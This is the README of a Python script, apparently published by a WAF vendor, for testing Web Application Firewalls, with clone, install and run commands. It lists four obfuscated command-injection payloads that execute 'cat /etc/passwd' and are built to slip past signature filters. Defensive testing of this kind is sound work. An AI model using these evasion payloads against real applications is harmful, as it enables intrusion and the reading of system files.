# WAF Bypass script

WAF bypass is a simple script written in Python3 for testing Web Application Firewall. Turn off ban mode before use.

## When using, do not violate the law. We are not responsible for the use of the program.

A script developed for internal needs, including for testing Nemesis WAF and Nemesida WAF Free, but you can use it to test any WAF.

![WAF Bypass Script](https://camo.githubusercontent.com/9ccddb9274eefa8bbe31cc1b0df79782ea6a92d5985b8eeab093a2cd83ad834a/68747470733a2f2f686162726173746f726167652e6f72672f776562742f73642f756a2f39312f7364756a39317333752d5f356a653970666b6e64306577696c6a732e706e67)

There are attacks for which it is impossible to create a signature, while not increasing the number of false positives. Therefore, it is absolutely normal that Nemesida WAF Free bypass the attack, and the commercial version of Nemesida WAF Free blocks. For example, we can execute the <code>cat /etc/passwd</code> command in the following ways:
<pre>
%2f???%2f??t%20%2f???%2fp??s??
cat+/e't'c/pa'ss'wd
e'c'ho 'swd test pentest' |awk '{print "cat /etc/pas"$1}' | bash
ec'h'o 'cat /etc/examplewd' | sed 's/example/pass/g' | bash
</pre>

## How to run

<pre>
# git clone https://github.com/nemesida-waf/waf_bypass.git /opt/waf-bypass/
# python3 -m pip install -r /opt/waf-bypass/requirements.txt

# python3 /opt/waf-bypass/main.py --host='example.com'
or
# python3 /opt/waf-bypass/main.py --host='example.com' --proxy='http://proxy.example.com:3128'

</pre>
